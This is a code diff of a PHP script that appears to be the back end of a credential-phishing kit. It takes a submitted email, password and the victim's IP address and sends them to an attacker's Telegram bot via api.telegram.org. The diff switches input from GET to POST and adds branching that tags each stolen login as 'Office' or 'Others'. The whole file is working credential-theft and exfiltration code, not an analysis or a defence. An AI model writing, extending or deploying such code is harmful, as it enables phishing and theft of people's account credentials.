@@ -1,16 +1,25 @@
 <?php
 
-	$log = $_GET['u'];
-	$pass= $_GET['p'];
-	$token = $_GET['makin'];
-	$chat_id = $_GET['chatid'];
+
+	$log = $_POST['u'];
+	$pass= $_POST['p'];
+	$token = $_POST['makin'];
+	$chat_id = $_POST['chatid'];
+	$regtype= $_POST['signup'];
 	$ip = getenv("REMOTE_ADDR");
 	$date = date("D/M/d, Y g:i a");
 
 
-	$message = "Email: $log%0APass: $pass%0AIP address: $ip%0ASubmitted on $date %0A--------Office---------";
+	$msgoff = "Email: $log%0APass: $pass%0AIP address: $ip%0ASubmitted on $date %0A--------Office---------";
 
-$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$message";
+	$msgoth = "Email: $log%0APass: $pass%0AIP address: $ip%0ASubmitted on $date %0A--------Others---------";
+
+if ($regtype==="office"){
+	$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$msgoff";
+}
+else{
+		$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$msgoth";
+}
 
 if(!empty($chat_id)){
 
@@ -25,6 +34,8 @@ if(!empty($chat_id)){
 $context = stream_context_create($opts);
 $fp = fopen($url, 'r', false, $context);
 fclose($fp);
+echo json_encode(array('signal'=>'ok'));
+
 
 }
 else{
